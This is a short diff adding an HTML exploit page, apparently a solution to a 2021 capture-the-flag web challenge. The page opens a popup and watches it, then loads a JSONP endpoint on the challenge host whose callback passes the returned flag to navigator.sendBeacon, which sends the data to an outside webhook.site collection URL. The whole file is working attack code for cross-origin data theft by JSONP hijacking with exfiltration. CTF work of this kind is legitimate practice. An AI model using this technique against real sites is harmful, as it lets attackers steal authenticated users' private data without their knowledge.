@@ -1,0 +1,13 @@
+<script>
+function load (data) {
+	navigator.sendBeacon('https://webhook.site/4936b7f9-93a9-4c62-9239-3125cccdc0f7', data.items[0])
+}
+if (!localStorage.done) {
+	w = window.open('jason_2.html')
+	setInterval(function () {
+		try { w.location.href }
+		catch (e) { localStorage.done = true; location.reload() }
+	}, 10)
+}
+</script>
+<script referrerpolicy="no-referrer" src="https://jason.2021.chall.actf.co/flags?callback=load"></script>
